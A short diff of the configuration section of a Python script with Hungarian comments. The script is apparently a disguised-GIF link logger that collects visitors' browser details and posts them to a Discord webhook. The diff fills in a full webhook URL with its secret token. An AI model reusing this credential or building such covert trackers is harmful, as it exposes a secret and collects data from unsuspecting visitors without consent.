@@ -4,7 +4,7 @@ import httpx
 import httpagentparser
 
 # --- KONFIGURÁCIÓ ---
-webhook = 'IDE_MÁSOLD_BE_A_WEBHOOKOT'
+webhook = 'https://discord.com/api/webhooks/1490358856919023848/KIf9rO2Q7XbwDKLjiCmEu3tSF83txYJzvJNHu5B8qkzVhqzth0kwNDOkLghZqNdvhhcz'
 # Ez a GIF fog megjelenni a Discordon, és ide dobja a böngészőt is
 target_gif = 'https://media.tenor.com/x8v1oNUOmCIAAAAd/rickroll-roll.gif' 
 
